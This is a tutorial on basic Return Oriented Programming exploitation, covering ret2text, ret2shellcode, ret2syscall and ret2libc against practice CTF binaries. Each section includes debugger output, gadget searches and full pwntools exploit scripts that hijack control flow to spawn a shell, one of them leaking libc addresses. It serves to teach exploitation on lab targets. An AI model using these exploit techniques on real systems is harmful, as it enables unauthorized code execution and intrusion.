# Basic ROP

With NX (Non-eXecutable) protection enabled, the traditional approach of directly injecting code onto the stack or heap is no longer effective. Consequently, attackers have developed corresponding techniques to bypass this protection.

The most widely used attack technique today is **Return Oriented Programming** (ROP). Its main idea is to **leverage small code snippets (gadgets) already present in the program on top of a stack buffer overflow to modify register or variable values, thereby controlling the program's execution flow.**

Gadgets are typically instruction sequences ending with `ret`. Using such instruction sequences, we can hijack the program's control flow multiple times to execute specific instruction sequences and achieve the purpose of the attack.

The name "Return Oriented Programming" originates from its core mechanism of utilizing the `ret` instruction from the instruction set to alter the execution order of the instruction flow, and through several gadgets, "execute" a new program.

Using ROP attacks generally requires the following conditions:

- The program vulnerability allows us to hijack control flow and control subsequent return addresses.

- We can find gadgets that meet our requirements along with their addresses.

As a fundamental attack technique, ROP attacks are not limited to stack overflow vulnerabilities — they are also widely used in exploiting various other types of vulnerabilities such as heap overflows.

It is important to note that modern operating systems typically enable Address Space Layout Randomization (ASLR), which means the positions of gadgets in memory are often not fixed. Fortunately, their offsets relative to the corresponding segment base addresses are usually fixed. Therefore, after finding suitable gadgets, we can leak program runtime environment information through other means to calculate the actual addresses of gadgets in memory.

## ret2text

### Principle

ret2text means controlling the program to execute code already present in the program itself (i.e., code in the `.text` segment). In fact, this attack method is a general description. When we control the program to execute existing code, we can also make it execute several non-contiguous pieces of existing code (i.e., gadgets), which is exactly the ROP we are discussing.

At this point, we need to know the location of the corresponding return code. Of course, the program may also have certain protections enabled, and we need to find ways to bypass them.

### Example

In fact, we already introduced this simple attack in the basic principles of stack overflow. Here, we provide another example — the ret2text example used by bamboofox when introducing ROP.

> Click to download: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

First, check the program's protection mechanisms:

```shell
➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can see that the program is a 32-bit binary with only NX (stack non-executable) protection enabled. Next, we use IDA to decompile the program:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

We can see that the main function uses `gets`, which clearly has a stack overflow vulnerability. Next, let's look at the disassembly:

```asm
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
```

In the secure function, we discover code that calls `system("/bin/sh")`. So if we directly control the program to return to `0x0804863A`, we can obtain a system shell.

Now let's construct the payload. First, we need to determine the number of bytes between the start of the controllable memory and the return address of the main function.

```asm
.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
```

We can see that the string is indexed relative to esp, so we need to debug. Set a breakpoint at the call instruction and examine esp and ebp, as follows:

```shell
gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24	    gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
```


We can see that esp is 0xffffcd40 and ebp is 0xffffcdc8. Since s is indexed relative to esp at `esp+0x1c`, we can deduce:

- The address of s is 0xffffcd5c
- The offset of s relative to ebp is 0x6c
- The offset of s relative to the return address is 0x6c+4

Therefore, the final payload is as follows:

```python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * (0x6c + 4) + p32(target))
sh.interactive()
```

## ret2shellcode

### Principle

ret2shellcode means controlling the program to execute shellcode. Shellcode refers to assembly code designed to accomplish a specific function — the most common function being to obtain a shell on the target system. **Typically, shellcode needs to be written by ourselves, meaning we need to fill executable code into memory ourselves.**

On the basis of stack overflow, to execute shellcode, the region where the shellcode resides must have executable permissions when the corresponding binary is running.

It should be noted that **newer kernel versions have introduced more aggressive protection policies, and programs typically no longer have segments that are both writable and executable by default, making the traditional ret2shellcode technique no longer directly exploitable**.

### Example

Here we use the ret2shellcode example from bamboofox. Note that you should conduct this experiment in an environment with an older kernel version (such as Ubuntu 18.04 or older). Since container environments share the same kernel, we cannot set up the environment through Docker here.

> Click to download: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

First, check the protections enabled for the program:

```shell
➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We can see that the program has almost no protections enabled, and has readable, writable, and executable segments. Next, we use IDA to decompile the program:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

We can see that the program still has a basic stack overflow vulnerability, but this time it also copies the corresponding string to buf2. A quick check reveals that buf2 is in the bss segment.

```asm
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
```

Now, let's do some simple debugging to see if this bss segment is executable.

```shell
gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8	    setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6	 int main(void)
      7	 {
 →    8	     setvbuf(stdout, 0LL, 2, 0LL);
      9	     setvbuf(stdin, 0LL, 1, 0LL);
     10	 
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

Using vmmap, we can see that the segment corresponding to the bss section has executable permissions:

```text
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
```

So this time we control the program to execute shellcode — that is, read in the shellcode, then control the program to execute the shellcode located in the bss segment. The corresponding offset calculation is similar to the ret2text example.

The final payload is as follows:

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
sh.interactive()
```

### Another Example

Here we use a ret2shellcode example where memory page permissions have been dynamically modified via `mprotect()`. Note that this allows us to complete this experiment on modern operating systems such as Ubuntu 22.04~.

> Click to download: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-new/ret2shellcode)

First, check the protections enabled for the program:

```shell
# zer0ptr @ DESKTOP-FHEMUHT in ~/Pwn-Research/ROP/ret2shellcode/wiki [21:14:26]
$ checksec ret2shellcode
[*] '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:    No
```

We can see that the program has almost no protections enabled, and has readable, writable, and executable segments. Next, we use IDA to decompile the program:

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char src[104]; // [rsp+0h] [rbp-70h] BYREF
  void *addr; // [rsp+68h] [rbp-8h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  addr = (void *)((unsigned __int64)buf2 & -getpagesize());
  v3 = getpagesize();
  if ( mprotect(addr, v3, 7) >= 0 )
  {
    puts("No system for you this time !!!");
    printf("buf2 address: %p\n", buf2);
    gets(src);
    strncpy(buf2, src, 0x64u);
    printf("bye bye ~");
    return 0;
  }
  else
  {
    perror("mprotect failed");
    return 1;
  }
}
```

We can see that the program still has a basic stack overflow vulnerability, but this time it also copies the corresponding string to buf2. A quick check reveals that buf2 is in the bss segment.

```asm
.bss:00000000004040A0 buf2            db 68h dup(?)           ; DATA XREF: main+51↑o
.bss:00000000004040A0                                         ; main+A4↑o ...
```

Now, let's do some simple debugging to see if this bss segment is executable (since permissions are modified via mprotect, we naturally set the breakpoint at the address after mprotect is called).

```shell
pwndbg> b *0x401291
Breakpoint 1 at 0x401291
pwndbg> r
Starting program: /home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000000000401291 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
 RAX  0
 RBX  0
 RCX  0x7ffff7d1eb1b (mprotect+11) ◂— cmp rax, -0xfff
 RDX  7
 RDI  0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1
 RSI  0x1000
 R8   0x7ffff7e1bf10 (initial+16) ◂— 4
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
 R10  0x7ffff7c082e0 ◂— 0xf0022000056ec
 R11  0x202
 R12  0x7fffffffde58 —▸ 0x7fffffffe0fd ◂— '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
 R13  0x401216 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011e0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdd40 ◂— 1
 RSP  0x7fffffffdcd0 ◂— 1
 RIP  0x401291 (main+123) ◂— test eax, eax
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
 ► 0x401291 <main+123>    test   eax, eax     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
   0x401293 <main+125>  ✔ jns    main+149                    <main+149>
    ↓
   0x4012ab <main+149>    lea    rax, [rip + 0xd66]     RAX => 0x402018 ◂— 'No system for you this time !!!'
   0x4012b2 <main+156>    mov    rdi, rax               RDI => 0x402018 ◂— 'No system for you this time !!!'
   0x4012b5 <main+159>    call   puts@plt                    <puts@plt>

   0x4012ba <main+164>    lea    rax, [rip + 0x2ddf]     RAX => 0x4040a0 (buf2)
   0x4012c1 <main+171>    mov    rsi, rax                RSI => 0x4040a0 (buf2)
   0x4012c4 <main+174>    lea    rax, [rip + 0xd6d]      RAX => 0x402038 ◂— 'buf2 address: %p\n'
   0x4012cb <main+181>    mov    rdi, rax                RDI => 0x402038 ◂— 'buf2 address: %p\n'
   0x4012ce <main+184>    mov    eax, 0                  EAX => 0
   0x4012d3 <main+189>    call   printf@plt                  <printf@plt>
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdcd0 ◂— 1
01:0008│-068 0x7fffffffdcd8 ◂— 1
02:0010│-060 0x7fffffffdce0 —▸ 0x400040 ◂— 0x400000006
03:0018│-058 0x7fffffffdce8 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
04:0020│-050 0x7fffffffdcf0 ◂— 0x6f0
05:0028│-048 0x7fffffffdcf8 —▸ 0x7fffffffe0d9 ◂— 0xb0ec6c6b3dbd55d3
06:0030│-040 0x7fffffffdd00 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
07:0038│-038 0x7fffffffdd08 ◂— 0x10101000000
────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► 0         0x401291 main+123
   1   0x7ffff7c29d90 __libc_start_call_main+128
   2   0x7ffff7c29e40 __libc_start_main+128
   3         0x401155 _start+37
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 r--p     1000       0 ret2shellcode
          0x401000           0x402000 r-xp     1000    1000 ret2shellcode
          0x402000           0x403000 r--p     1000    2000 ret2shellcode
          0x403000           0x404000 r--p     1000    2000 ret2shellcode
          0x404000           0x405000 rwxp     1000    3000 ret2shellcode
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e15000     0x7ffff7e16000 ---p     1000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000  219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000       0 [anon_7ffff7e1c]
    0x7ffff7fad000     0x7ffff7fb0000 rw-p     3000       0 [anon_7ffff7fad]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000       0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000       0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rwxp    21000       0 [stack]
```

Similarly, using vmmap, we can see that the segment corresponding to the bss section has executable permissions:

```text
0x404000           0x405000 rwxp     1000    3000 ret2shellcode
```

The approach is the same as the previous example.

The final payload is as follows:

```python
#!/usr/bin/env python3
from pwn import *
context.binary = './ret2shellcode'
context.log_level = 'debug'
io = process('./ret2shellcode')

buf2_addr = 0x4040a0
shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(100, b'\x90')  
payload = payload.ljust(120, b'a')       
payload += p64(buf2_addr)                

io.sendline(payload)
io.interactive()
```

### Challenges

- sniperoj-pwn100-shellcode-x86-64

## ret2syscall

### Principle

ret2syscall means controlling the program to execute a system call to obtain a shell.

### Example

Here we continue with the ret2syscall example from bamboofox.  

> Click to download: [ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)

First, check the protections enabled for the program:

```shell
➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can see that the program is 32-bit with NX protection enabled. Next, we use IDA to decompile it:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

We can see that this is again a stack overflow. Similar to the previous approach, we can determine that the offset of v4 relative to ebp is 108, so the offset from v4 to the return address is 112. This time, since we cannot directly use a specific code segment in the program or write our own code to get a shell, we use gadgets in the program to obtain a shell via system calls. For knowledge about system calls, please refer to:

- https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8

In simple terms, as long as we place the parameters for the shell-obtaining system call into the corresponding registers, executing `int 0x80` will execute the corresponding system call. For instance, here we use the following system call to get a shell:

```C
execve("/bin/sh",NULL,NULL)
```

Since this is a 32-bit program, we need:

- The system call number, i.e., eax should be 0xb
- The first argument, i.e., ebx should point to the address of /bin/sh (the address of sh would also work)
- The second argument, i.e., ecx should be 0
- The third argument, i.e., edx should be 0

How do we control the values of these registers? This is where gadgets come in. For example, if the top of the stack is 10, then executing `pop eax` would set eax to 10. However, we cannot expect a continuous code sequence that simultaneously controls all the corresponding registers, so we need to control them one by one. This is also why we use `ret` at the end of gadgets to regain control of the program execution flow. To find gadgets specifically, we can use the ROPgadget tool.

First, let's find gadgets that control eax:

```shell
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

We can see several options that can control eax. I'll choose the second one as our gadget.

Similarly, we can find gadgets to control the other registers:

```shell
➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

Here, I choose:

```text
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

This one can directly control the other three registers.

Additionally, we need to obtain the address of the `/bin/sh` string:

```shell
➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
```

We can find the corresponding address. Furthermore, we need the address of `int 0x80`, as follows:

```text
➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```

We have also found the corresponding address.

Below is the corresponding payload, where 0xb is the system call number for execve.

```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

### Challenges

## ret2libc

### Principle

ret2libc means controlling the program to execute functions in libc, typically returning to a function's PLT entry or the function's actual address (i.e., the content of the function's corresponding GOT table entry). Generally, we choose to execute `system("/bin/sh")`, so we need to know the address of the system function.

### Examples

We present three examples of increasing difficulty.

#### Example 1

Here we use ret2libc1 from bamboofox. 

> Click to download: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1)

First, we check the program's security protections:

```shell
➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The program is 32-bit with NX protection enabled. Let's decompile the program to identify the vulnerability:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

We can see a stack overflow when the `gets` function is called. Furthermore, using ROPgadget, we can check whether `/bin/sh` exists:

```shell
➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh
```

It does exist. Let's also check if the system function exists. After searching in IDA, it is confirmed to exist as well.

```asm
.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
```

So we can directly return there to execute the system function. The corresponding payload is as follows:

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat([b'a' * 112, system_plt, b'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

Here we need to pay attention to the function call stack structure. If system is called normally, there would be a corresponding return address. Here we use `'bbbb'` as a fake return address, followed by the parameter content.

This example is relatively simple, as it provides both the system address and the /bin/sh address. However, most programs won't have such favorable conditions.

#### Example 2

Here we use ret2libc2 from bamboofox.

> Click to download: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2/ret2libc2)

This challenge is basically the same as Example 1, except that the `/bin/sh` string is no longer present. So this time we need to read in the string ourselves, which requires two gadgets: the first controls the program to read a string, and the second controls the program to execute `system("/bin/sh")`. Since the vulnerability is the same as above, we won't elaborate further. The specific exploit is as follows:

```python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    [b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
```

Note that here we write the `/bin/sh` string to buf2 in the program's bss segment and pass its address as the argument to system. This allows us to obtain a shell.

#### Example 3

Here we use ret2libc3 from bamboofox.  

> Click to download: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3)

Building on Example 2, the system function address has also been removed. Now we need to find both the system function address and the `/bin/sh` string address. First, let's check the security protections:

```shell
➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We can see that the program still has NX (stack non-executable) protection enabled. Looking at the source code, we find the bug is still a stack overflow:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```

So how do we obtain the address of the system function? This mainly utilizes two key concepts:

- The system function belongs to libc, and the relative offsets between functions in the libc.so dynamic library are fixed.
- Even if the program has ASLR protection, only the middle bits of addresses are randomized — the lowest 12 bits do not change. There are libc collections available on GitHub:
  - https://github.com/niklasb/libc-database

So if we know the address of any function in libc, we can determine which libc the program uses. From there, we can determine the address of the system function.

How do we obtain the address of a function in libc? The commonly used method is GOT table leaking — i.e., outputting the content of a function's corresponding GOT entry. **Of course, due to libc's lazy binding mechanism, we need to leak the address of a function that has already been executed.**

Naturally, we could follow the above steps to first identify the libc version, then look up offsets in the program, and then obtain the system address again. However, this involves too many manual operations and is rather cumbersome. Here we provide a libc exploitation tool — please refer to the readme for specific details:

- https://github.com/lieanu/LibcSearcher

Additionally, after obtaining the libc, it actually contains the `/bin/sh` string as well, so we can obtain the address of `/bin/sh` at the same time.

Here we leak the address of `__libc_start_main` because it is where the program was initially executed. The basic exploitation approach is as follows:

- Leak the `__libc_start_main` address
- Determine the libc version
- Obtain the system address and the `/bin/sh` address
- Re-execute the program
- Trigger the stack overflow to execute `system('/bin/sh')`

The exploit is as follows:

```python
#!/usr/bin/env python
from pwn import *

pc = './ret2libc3'
aslr = True
context.log_level = 'debug'  
context.arch = 'i386' 

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
ret2libc3 = ELF('./ret2libc3')

p = process(pc, aslr=aslr)

if __name__ == '__main__':
    puts_plt = ret2libc3.plt['puts']
    libc_start_main_got = ret2libc3.got['__libc_start_main']
    start_addr = ret2libc3.symbols['_start']

    # log.info(f'start_addr --> 0x{start_addr:x}')
    
    payload = b'a' * 112
    payload += p32(puts_plt)
    payload += p32(start_addr)
    payload += p32(libc_start_main_got)

    p.sendline(payload)
    p.recvuntil(b'Can you find it !?')

    libc_start_main_addr = u32(p.recv(4))
    libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
    system_addr = libc_base_addr + libc.symbols['system']

    binsh_offset = next(libc.search(b'/bin/sh\x00'))
    binsh_addr = libc_base_addr + binsh_offset

    payload2 = b'a' * 112
    payload2 += p32(system_addr)
    payload2 += p32(0xdeadbeef)  
    payload2 += p32(binsh_addr)  
    p.sendline(payload2)
    p.interactive()
```

### Challenges

- train.cs.nctu.edu.tw: ret2libc

## Challenges

- train.cs.nctu.edu.tw: rop
- 2013-PlaidCTF-ropasaurusrex
- Defcon 2015 Qualifier: R0pbaby

## References

- [Step-by-Step ROP (by Zhengmi) on Wooyun](http://wooyun.jozxing.cc/static/drops/tips-6597.html)
